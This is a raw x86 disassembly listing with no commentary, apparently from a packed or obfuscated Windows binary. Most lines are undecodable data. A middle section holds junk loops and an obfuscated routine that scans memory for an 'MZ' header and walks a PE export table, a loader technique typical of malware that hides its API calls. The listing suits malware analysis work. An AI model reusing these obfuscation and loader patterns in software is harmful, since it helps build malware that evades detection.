  40e208:	in     eax,0xb9
  40e20a:	lea    ebp,[ebp+0x1e5b4fde]
  40e210:	adc    eax,0x6535a06c
  40e215:	dec    edx
  40e216:	sub    edx,ebx
  40e218:	jne    0x40e269
  40e21a:	fiadd  DWORD PTR [ebp+0x7903c9ae]
  40e220:	xchg   DWORD PTR [ebx-0x14],ebp
  40e223:	push   ebp
  40e224:	in     eax,0x85
  40e226:	adc    esp,ebp
  40e228:	dec    edx
  40e229:	into   
  40e22a:	and    eax,0xaae765df
  40e22f:	mov    ds:0xc36a8915,eax
  40e234:	adc    al,BYTE PTR [esi+0x3b]
  40e237:	jno    0x40e210
  40e239:	push   ss
  40e23a:	push   ss
  40e23b:	cmp    al,0x41
  40e23d:	jno    0x40e1d5
  40e23f:	es (bad) 
  40e241:	mov    bh,0x98
  40e243:	mov    esi,0xf4866c7
  40e248:	dec    ebx
  40e249:	test   eax,0xf36bfc17
  40e24e:	xchg   esi,eax
  40e24f:	loopne 0x40e2bf
  40e251:	fwait
  40e252:	outs   dx,DWORD PTR ds:[esi]
  40e253:	out    0x78,al
  40e255:	jo     0x40e25f
  40e257:	jge    0x40e287
  40e259:	dec    edx
  40e25a:	lods   eax,DWORD PTR ds:[esi]
  40e25b:	daa    
  40e25c:	stos   BYTE PTR es:[edi],al
  40e25d:	push   es
  40e25e:	fucomip st,st(3)
  40e260:	sbb    eax,0x7fcd2b57
  40e265:	gs push ebp
  40e267:	jb     0x40e2c3
  40e269:	pop    ebx
  40e26a:	loope  0x40e276
  40e26c:	ss stos BYTE PTR es:[edi],al
  40e26e:	sbb    DWORD PTR [ecx+0x51ac7b5b],0xfbc24081
  40e278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e279:	mov    bh,0xe
  40e27b:	out    dx,al
  40e27c:	sbb    eax,0x99583742
  40e281:	jmp    0xbe7f:0xee608e
  40e288:	stc    
  40e289:	add    al,0x56
  40e28b:	xchg   edx,eax
  40e28c:	and    eax,0xc1a52fea
  40e291:	test   eax,0xbde6d5b5
  40e296:	xchg   ecx,eax
  40e298:	dec    edx
  40e299:	lods   al,BYTE PTR ds:[esi]
  40e29a:	out    dx,al
  40e29b:	lods   eax,DWORD PTR ds:[esi]
  40e29c:	fwait
  40e29d:	bound  ebx,QWORD PTR [edx]
  40e29f:	jae    0x40e25c
  40e2a1:	bound  ebx,QWORD PTR [ebp+0x25]
  40e2a4:	add    DWORD PTR [esi-0x733cc1e9],0x804ef8d6
  40e2ae:	fisubr WORD PTR [ebp+0x58]
  40e2b1:	aaa    
  40e2b2:	xlat   BYTE PTR ds:[ebx]
  40e2b3:	sbb    al,0xda
  40e2b5:	pop    esp
  40e2b6:	cmc    
  40e2b7:	pop    es
  40e2b8:	xor    DWORD PTR [ecx+0x50],esp
  40e2bb:	sub    BYTE PTR [edi-0x3960628],dl
  40e2c1:	lods   eax,DWORD PTR ds:[esi]
  40e2c2:	cmc    
  40e2c3:	in     eax,dx
  40e2c4:	cmp    cl,BYTE PTR [edx+ebx*2]
  40e2c7:	cmp    al,0x44
  40e2c9:	ins    DWORD PTR es:[edi],dx
  40e2ca:	cmp    BYTE PTR [eax-0x51],bl
  40e2cd:	nop
  40e2ce:	or     BYTE PTR [ebp+0x35],ch
  40e2d1:	inc    ebx
  40e2d2:	push   eax
  40e2d3:	test   eax,0xebe3134f
  40e2d8:	shr    dl,1
  40e2da:	add    dl,BYTE PTR [ebx+0x44d37db5]
  40e2e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2e1:	cmp    dl,BYTE PTR [ecx]
  40e2e3:	fld    DWORD PTR [edi]
  40e2e5:	in     eax,dx
  40e2e6:	sbb    DWORD PTR [eax+0x462d4c6e],esi
  40e2ec:	xor    DWORD PTR ds:[esi-0x41],edx
  40e2f0:	popa   
  40e2f1:	or     BYTE PTR [ebp-0x31],dh
  40e2f4:	inc    esi
  40e2f5:	cmp    DWORD PTR [ebx-0x18],0x29
  40e2f9:	mov    ds:0x937676e1,eax
  40e2fe:	mov    edx,0xaf91dbab
  40e303:	jo     0x40e366
  40e305:	cld    
  40e306:	xchg   esi,eax
  40e307:	cmp    BYTE PTR cs:[ecx-0x6b],dh
  40e30b:	les    esp,FWORD PTR [ecx]
  40e30d:	add    al,0x76
  40e30f:	jecxz  0x40e32c
  40e311:	(bad)  
  40e312:	sar    BYTE PTR [ebp-0x5773d832],1
  40e318:	dec    ecx
  40e319:	mov    esi,0xe39e4fde
  40e31e:	loope  0x40e33c
  40e320:	es das 
  40e322:	loope  0x40e2f4
  40e324:	mov    bl,0x89
  40e326:	ficom  WORD PTR [edx+0x48]
  40e329:	retf   0x7cd4
  40e32c:	in     eax,dx
  40e32d:	inc    edx
  40e32e:	jae    0x40e39d
  40e330:	sub    eax,ebx
  40e332:	adc    ah,BYTE PTR [edi-0x7b]
  40e335:	sbb    eax,0x697ce22f
  40e33a:	addr16 pop ebx
  40e33c:	jmp    0x1806:0x7ce1e9b0
  40e343:	sub    DWORD PTR [eax+ebp*4],0xbd5e736f
  40e34a:	push   es
  40e34b:	mov    esi,0x81267be9
  40e350:	xchg   esi,eax
  40e351:	test   cl,cl
  40e353:	ror    esi,0xc
  40e356:	shl    BYTE PTR [esi],1
  40e358:	and    eax,0xc49ef22a
  40e35d:	dec    ecx
  40e35e:	pushf  
  40e35f:	xor    DWORD PTR [ebp+0x4e29d70],ebx
  40e365:	jmp    0x5b1a2ba0
  40e36a:	push   eax
  40e36b:	mul    bh
  40e36d:	cmp    dl,BYTE PTR [ebx-0x2f]
  40e370:	and    al,0xa4
  40e372:	adc    al,0xdd
  40e374:	test   eax,0xe620a03f
  40e379:	jnp    0x40e35a
  40e37b:	add    eax,edx
  40e37d:	imul   eax,DWORD PTR [esi]
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x842d5ef2
  40e671:	idiv   DWORD PTR [edx+0x73]
  40e674:	retf   0x7a7a
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e634
  40e67c:	adc    al,0x54
  40e67e:	or     ebp,DWORD PTR [edi+0x7f59dfe7]
  40e684:	retf   
  40e685:	imul   esp,DWORD PTR [eax+ecx*2],0x8dab635d
  40e68c:	stos   BYTE PTR es:[edi],al
  40e68d:	sbb    al,0xd8
  40e68f:	push   ebx
  40e690:	sbb    bh,BYTE PTR [ebx]
  40e692:	test   al,0x8c
  40e694:	not    DWORD PTR [ecx+0x7e]
  40e697:	call   0x245f:0x7f1d8a69
  40e69e:	xor    dh,BYTE PTR [esi]
  40e6a0:	cmc    
  40e6a1:	in     eax,0xbd
  40e6a3:	push   ecx
  40e6a4:	mov    esp,0x7617042
  40e6a9:	imul   ecx,esp,0xcb966694
  40e6af:	outs   dx,BYTE PTR ds:[esi]
  40e6b0:	(bad)  
  40e6b1:	push   ebp
  40e6b2:	(bad)  
  40e6b3:	jns    0x40e71d
  40e6b5:	mov    dh,0x7f
  40e6b7:	push   edx
  40e6b8:	stos   BYTE PTR es:[edi],al
  40e6b9:	push   cs
  40e6ba:	xchg   ebp,eax
  40e6bb:	fstp   TBYTE PTR [ecx]
  40e6bd:	lods   al,BYTE PTR ds:[esi]
  40e6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6bf:	les    edi,FWORD PTR [ecx+edx*8-0x70]
  40e6c3:	dec    ebp
  40e6c4:	inc    ecx
  40e6c5:	fisub  WORD PTR [ebx]
  40e6c7:	ror    BYTE PTR [ebx],1
  40e6c9:	cli    
  40e6ca:	dec    eax
  40e6cb:	fimul  WORD PTR [ebx+0x5b]
  40e6ce:	jp     0x40e710
  40e6d0:	and    al,BYTE PTR [ecx]
  40e6d2:	out    dx,eax
  40e6d3:	mov    BYTE PTR [edx+edx*2-0x38dc3056],dl
  40e6da:	aaa    
  40e6db:	sub    eax,0xaa6b5dfe
  40e6e0:	pop    edx
  40e6e1:	mov    ch,BYTE PTR [edx+0x14]
  40e6e4:	push   esi
  40e6e5:	scas   al,BYTE PTR es:[edi]
  40e6e6:	outs   dx,DWORD PTR ds:[esi]
  40e6e7:	scas   al,BYTE PTR es:[edi]
  40e6e8:	(bad)  
  40e6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6ea:	dec    eax
  40e6eb:	sbb    edi,DWORD PTR [ecx+edx*4+0x56]
  40e6ef:	fmul   DWORD PTR [ecx]
  40e6f1:	daa    
  40e6f2:	test   al,0x62
  40e6f4:	scas   al,BYTE PTR es:[edi]
  40e6f5:	jecxz  0x40e754
  40e6f7:	add    eax,0x62e1fd3f
  40e6fc:	pushf  
  40e6fd:	sbb    eax,esi
  40e6ff:	dec    ecx
  40e700:	cmp    DWORD PTR [ecx+0x58],edx
  40e703:	or     cl,BYTE PTR [esi]
  40e705:	xchg   esp,eax
  40e706:	outs   dx,DWORD PTR ds:[esi]
  40e707:	xchg   ebp,eax
  40e708:	add    eax,0x211b168f
  40e70d:	mov    bl,0xf3
  40e70f:	cmp    cl,BYTE PTR [edx+0x4b]
  40e712:	mov    esi,?
  40e714:	std    
  40e715:	mov    BYTE PTR [edx+0x5f0f14ac],0xe8
  40e71c:	shl    BYTE PTR [edx+0x3e8053c3],1
  40e722:	cmp    eax,0x4a1f3bdb
  40e727:	repnz cmp BYTE PTR [ebx],bl
  40e72a:	mov    ch,0x5b
  40e72c:	mov    edx,0x68a99c43
  40e731:	(bad)  
  40e732:	dec    ebx
  40e733:	adc    al,0x12
  40e735:	pop    edx
  40e736:	je     0x40e760
  40e738:	push   ebx
  40e739:	int    0xf0
  40e73b:	sbb    ebp,DWORD PTR [edx]
  40e73d:	out    0xf9,eax
  40e73f:	cmp    esp,ecx
  40e741:	mov    eax,ds:0xb0e636f
  40e746:	pop    edx
  40e747:	out    0x2b,eax
  40e749:	mov    WORD PTR ss:[ebx+eax*8],?
  40e74d:	sub    al,BYTE PTR [edx-0x22fd3081]
  40e753:	mov    ah,0x98
  40e755:	add    DWORD PTR [ecx+0x49],edi
  40e758:	test   DWORD PTR [ecx+0x6caeb0ee],edi
  40e75e:	scas   eax,DWORD PTR es:[edi]
  40e75f:	lock mov cl,0x5f
  40e762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e763:	push   ebx
  40e764:	call   0x9415f900
  40e769:	and    eax,0xbcee0389
  40e76e:	mov    ecx,0x7af5e3c8
  40e773:	push   esp
  40e774:	sbb    eax,0xcc252d1d
  40e779:	fisttp QWORD PTR [edi+0x65e2678b]
  40e77f:	mov    bh,0x1c
  40e781:	mov    ch,0x16
  40e783:	sbb    al,0xfd
  40e786:	mov    al,0x7b
  40e788:	push   edx
  40e789:	popa   
  40e78a:	push   0x12
  40e78c:	fucomip st,st(0)
  40e78e:	mov    edx,0x1e27c853
  40e793:	test   BYTE PTR [edi],ah
  40e795:	jmp    0x46793aae
  40e79a:	iret   
  40e79b:	mov    ah,BYTE PTR [ebp+0x18090216]
  40e7a1:	jns    0x40e7eb
  40e7a3:	jl     0x40e76d
  40e7a5:	popf   
  40e7a6:	fcmovbe st,st(6)
  40e7a8:	add    eax,DWORD PTR [eax+edx*2+0x441fc3e4]
  40e7af:	int3   
  40e7b0:	xlat   BYTE PTR ds:[ebx]
  40e7b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7b2:	(bad)  
  40e7b3:	out    dx,al
  40e7b4:	pusha  
  40e7b5:	rcr    ah,cl
  40e7b7:	xor    al,BYTE PTR [ebx+edx*8-0x35ee2bd7]
  40e7be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7bf:	vshufpd xmm5,xmm5,XMMWORD PTR [ebx-0x55],0x5d
  40e7c5:	add    eax,0xed385b68
  40e7ca:	jle    0x40e7a3
  40e7cc:	xchg   edx,eax
  40e7cd:	dec    esp
  40e7ce:	(bad)  
  40e7cf:	cmp    eax,0xd60c2776
  40e7d4:	lea    eax,[eax]
  40e7d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7d7:	dec    edi
  40e7d8:	jl     0x40e7a3
  40e7da:	pushf  
  40e7db:	inc    edx
  40e7dc:	outs   dx,DWORD PTR ds:[esi]
  40e7dd:	fs jbe 0x40e853
  40e7e0:	mov    al,0x24
  40e7e2:	jecxz  0x40e7c9
  40e7e4:	into   
  40e7e5:	xor    BYTE PTR [ebx+0x63],dh
  40e7e8:	pop    ds
  40e7e9:	mov    ds:0x53205e38,eax
  40e7ee:	call   0x9756:0x47496df3
  40e7f5:	add    eax,0xf531ab82
  40e7fa:	ds dec esp
  40e7fc:	je     0x40e864
  40e7fe:	sbb    eax,DWORD PTR [ebx-0x69]
  40e801:	loop   0x40e7e2
  40e803:	add    dl,BYTE PTR [edi-0x76]
  40e806:	push   ds
  40e807:	push   edi
  40e808:	inc    eax
  40e809:	mov    ebx,0x1c1d3077
  40e80e:	and    BYTE PTR [esi-0x7f4fcc7e],0x1b
  40e815:	add    DWORD PTR [edx],edi
  40e817:	jle    0x40e890
  40e819:	cmp    al,0xc3
  40e81b:	in     eax,0x1b
  40e81d:	shl    DWORD PTR [edi-0x55057b2e],0x6d
  40e824:	(bad)  
  40e825:	sbb    DWORD PTR [esi+0x6a],ebp
  40e828:	mov    DWORD PTR ds:0xbeede537,0xf857c6d2
  40e832:	sahf   
  40e833:	fisub  WORD PTR [edi+eiz*2-0x59e326ef]
  40e83a:	imul   BYTE PTR [edx+0x44]
  40e83d:	inc    esp
  40e83e:	inc    esp
  40e83f:	or     al,0x33
  40e841:	not    BYTE PTR [esi]
  40e843:	cmp    ch,BYTE PTR ds:0x67a3b204
  40e849:	iret   
  40e84a:	jecxz  0x40e86d
  40e84c:	push   edi
  40e84d:	fstp   st(0)
  40e84f:	(bad)  
  40e850:	xor    al,0xdd
  40e852:	cmp    eax,0x8eed019b
  40e857:	fucomip st,st(7)
  40e859:	fsubr  st(4),st
  40e85b:	repz cmp DWORD PTR [eax],ecx
  40e85e:	inc    esp
  40e85f:	pop    edx
  40e860:	sub    ecx,ebp
  40e862:	pop    ds
  40e863:	(bad)  
  40e864:	dec    al
  40e866:	inc    eax
  40e867:	push   esp
  40e868:	arpl   WORD PTR [esi],di
  40e86a:	call   0xf49a:0x9533420f
  40e871:	xor    BYTE PTR [ebp+0x4b48dc03],0x35
  40e878:	shl    BYTE PTR [ecx-0x6c],1
  40e87b:	inc    ecx
  40e87c:	jno    0x40e8d5
  40e87e:	jo     0x40e808
  40e880:	or     DWORD PTR [edx+0xf7d5678],eax
  40e886:	push   ss
  40e887:	ror    BYTE PTR [edi+0x3c],cl
  40e88a:	arpl   WORD PTR [edi-0x64a183d6],ax
  40e890:	pop    edx
  40e891:	rcr    DWORD PTR [edx-0x3e6a70e7],0xab
  40e898:	je     0x40e843
  40e89a:	mov    al,ds:0x7617e7ec
  40e89f:	inc    ebx
  40e8a0:	and    cl,bl
  40e8a2:	xor    bl,dh
  40e8a4:	xchg   esp,eax
  40e8a5:	popf   
  40e8a6:	cmc    
  40e8a7:	mov    al,0x56
  40e8a9:	and    ch,BYTE PTR fs:[ebx+edi*4-0x66]
  40e8ae:	es in  al,dx
  40e8b0:	sub    DWORD PTR gs:[edx],edx
  40e8b3:	push   es
  40e8b4:	xchg   edi,eax
  40e8b5:	rcr    DWORD PTR ds:0x28aedcd0,cl
  40e8bb:	inc    eax
  40e8bc:	ins    BYTE PTR es:[edi],dx
  40e8bd:	loopne 0x40e853
  40e8bf:	mov    ah,0x82
  40e8c1:	ins    BYTE PTR es:[edi],dx
  40e8c2:	cld    
  40e8c3:	enter  0x1c7a,0x9c
  40e8c7:	cmc    
  40e8c8:	pop    ds
  40e8c9:	jmp    0x40e909
  40e8cb:	mov    al,0xde
  40e8cd:	jmp    0x40e897
  40e8cf:	push   edx
  40e8d0:	add    DWORD PTR [esi],esi
  40e8d2:	stos   BYTE PTR es:[edi],al
  40e8d3:	mov    al,0x43
  40e8d5:	push   es
  40e8d6:	pop    ebp
  40e8d7:	mov    eax,ds:0x82cd406f
  40e8dc:	fs sub eax,0x2ab9644d
  40e8e2:	int3   
  40e8e3:	stc    
  40e8e4:	inc    esi
  40e8e5:	test   BYTE PTR [ecx+0x7d],cl
  40e8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8e9:	dec    edi
  40e8ea:	scas   al,BYTE PTR es:[edi]
  40e8eb:	xchg   esp,eax
  40e8ec:	xchg   edi,eax
  40e8ed:	(bad)  
  40e8ee:	cli    
  40e8ef:	in     eax,dx
  40e8f0:	arpl   WORD PTR [edi],sp
  40e8f2:	xchg   BYTE PTR [esi-0x28999241],cl
  40e8f8:	and    BYTE PTR [ebx],0x64
  40e8fb:	je     0x40e902
  40e8fd:	mov    BYTE PTR [ebp+ecx*4+0x4d],0x76
  40e902:	mov    ch,0xc1
  40e904:	jo     0x40e95b
  40e906:	jmp    0x40e8a7
  40e908:	dec    ecx
  40e909:	mov    WORD PTR cs:[ebx-0x24201d42],gs
  40e910:	sbb    ebx,DWORD PTR [edx]
  40e912:	sar    DWORD PTR [edi-0x6d],0x24
  40e916:	arpl   WORD PTR [ebx+ebp*8+0x2a],ax
  40e91a:	sbb    bl,BYTE PTR [eax+edi*8+0x31]
  40e91e:	loop   0x40e944
  40e920:	call   FWORD PTR [edx+0x36]
  40e923:	repnz nop
  40e925:	lock jle 0x40e98c
  40e928:	cmp    ebx,DWORD PTR [ebx-0x5]
  40e92b:	loopne 0x40e94c
  40e92d:	xor    eax,esp
  40e92f:	enter  0x9c5a,0xe9
  40e933:	inc    edi
  40e934:	les    edi,FWORD PTR [ebp-0xf]
  40e937:	jp     0x40e8f5
  40e939:	add    ebp,ecx
  40e93b:	sbb    al,BYTE PTR [eax+eax*1+0x65]
  40e93f:	adc    BYTE PTR [ecx+eax*2+0x50],al
  40e943:	out    0xa1,al
  40e945:	dec    edx
  40e946:	dec    ebp
  40e947:	pop    ds
  40e948:	sti    
  40e949:	push   es
  40e94a:	jmp    DWORD PTR [ebx-0x154e3637]
  40e950:	push   ebx
  40e951:	sbb    eax,0x57caff71
  40e956:	aad    0x68
  40e958:	jmp    0x40e8f5
  40e95a:	and    ch,BYTE PTR [ebp+0x44]
  40e95d:	iret   
  40e95e:	clc    
  40e95f:	push   0xe
  40e961:	inc    esp
  40e962:	rcr    DWORD PTR [eax+edi*2+0x11],1
  40e966:	add    DWORD PTR [esi],0x192123f5
  40e96c:	out    dx,al
  40e96d:	mov    edx,0x959ce05e
  40e972:	mov    esp,0xd13683e7
  40e977:	push   ds
  40e978:	call   0xac33fff0
  40e97d:	arpl   WORD PTR [eax],di
  40e97f:	shl    BYTE PTR [edx-0x7ea92942],cl
  40e985:	inc    esi
  40e986:	retf   
  40e987:	fisttp QWORD PTR [edi-0x53d7ee36]
  40e98d:	mov    esi,0x9402bb8a
  40e992:	cs ret 0xb6d8
  40e996:	in     eax,dx
  40e997:	sbb    eax,0x45ed8fda
  40e99c:	dec    ecx
  40e99d:	or     al,0x23
  40e99f:	inc    ecx
  40e9a0:	hlt    
  40e9a1:	jg     0x40ea01
  40e9a3:	cmc    
  40e9a4:	outs   dx,BYTE PTR ds:[esi]
  40e9a5:	push   edi
  40e9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a7:	cli    
  40e9a8:	sbb    BYTE PTR [ebp+0x57ae2b77],cl
  40e9ae:	cmp    edx,ebp
  40e9b0:	rcr    BYTE PTR [ebp+esi*1-0x3f],0xb9
  40e9b5:	pop    ebp
  40e9b6:	adc    al,BYTE PTR [ebx+0x34611e45]
  40e9bc:	es rol ch,1
  40e9bf:	imul   ebx,eax,0xe89dc342
  40e9c5:	out    dx,al
  40e9c6:	popf   
  40e9c7:	cs and eax,0xf54cf1ca
  40e9cd:	pushf  
  40e9ce:	cli    
  40e9cf:	fisub  WORD PTR [edx+0x5cf70f83]
  40e9d5:	ss mov bh,0xbb
  40e9d8:	xor    cl,BYTE PTR [ebx+0x671bb3e]
  40e9de:	lds    esp,FWORD PTR [edx+0x46]
  40e9e1:	adc    DWORD PTR [ebx+edi*1+0x72],eax
  40e9e5:	push   ebp
  40e9e6:	cmp    al,0x32
  40e9e8:	setg   BYTE PTR [ebx-0x3]
  40e9ec:	jecxz  0x40e98c
  40e9ee:	cmp    eax,DWORD PTR [ebx-0x80]
  40e9f1:	xchg   esp,eax
  40e9f2:	ins    BYTE PTR es:[edi],dx
  40e9f3:	add    edi,DWORD PTR [ecx-0x5e]
  40e9f6:	push   ecx
  40e9f7:	je     0x40e98e
  40e9f9:	je     0x40ea63
  40e9fb:	stc    
  40e9fc:	dec    eax
  40e9fd:	popf   
  40e9fe:	jns    0x40ea5b
  40ea00:	je     0x40e9a0
  40ea02:	mov    edi,0xc8a92988
  40ea07:	inc    ecx
  40ea08:	(bad)  
  40ea09:	es repnz loope 0x40ea63
  40ea0d:	or     esi,DWORD PTR [ebx-0x6]
  40ea10:	imul   ecx,DWORD PTR [edi],0x9febd8aa
  40ea16:	jge    0x40ea44
  40ea18:	xor    ebx,DWORD PTR [ebx-0x59875e9f]
  40ea1e:	xchg   esp,eax
  40ea1f:	mov    edx,0xf324bc98
  40ea24:	inc    esp
  40ea25:	pop    eax
  40ea26:	dec    ebp
  40ea27:	hlt    
  40ea28:	int3   
  40ea29:	loopne 0x40ea94
  40ea2b:	and    DWORD PTR [esi],esi
